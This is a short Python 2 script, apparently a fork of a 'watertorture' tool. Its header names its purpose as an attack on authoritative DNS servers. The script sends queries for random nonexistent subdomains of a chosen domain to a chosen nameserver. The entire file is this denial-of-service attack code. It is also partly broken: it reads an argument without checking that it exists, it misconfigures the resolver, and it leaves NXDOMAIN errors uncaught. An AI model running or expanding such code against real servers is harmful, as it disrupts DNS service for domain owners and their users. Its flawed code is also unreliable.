#!/usr/bin/python
#Author : Antonio Taboada
#Date: 12/10/2016
#Filename: subdominio.py
#Purpose : Ataque DNS autoritativo con peticion de subdominios aleatorios inexistentes
#From: https://github.com/hackingyseguridad/watertorture/blob/master/subdominio.py 
#-- Forked by Christopher Gray
# Date: 4/19/18 - Version 0.0.4

import dns.resolver
import random
import sys
import socket

print(sys.argv)

if len(sys.argv) <= 1:
    #print "Using: " , sys.argv[1] , " for domain "
    print "Please add Domain and DNS server you want to query against."
    exit(0)
elif len(sys.argv) >= 2:
    if sys.argv[1]:
        dominio = sys.argv[1]
    else:
        dominio = 'google.com'

    if sys.argv[2]:
        dns.resolver.nameservers = [sys.argv[2]]
    else:
        # 8.8.8.8 is Google's public DNS server
        dns.resolver.nameservers = ['8.8.8.8']

    try:
        host=socket.gethostbyname(dominio)
    except:
        print "Domain not valid"
        exit(0)



    print "Domain:", dominio
    print "IP for Domain:", host
        
    for x in range(0, 10):
        print "We're on time %d" % (x)
        subdominio = str(random.randrange(10000000))
        url = subdominio+"."+dominio
        print "SubDomain:", url
        #r = dns.resolver.query('example.org', 'a')
        answers = dns.resolver.query(url)
        for rdata in answers: 
            print "IP SubDomain:", rdata

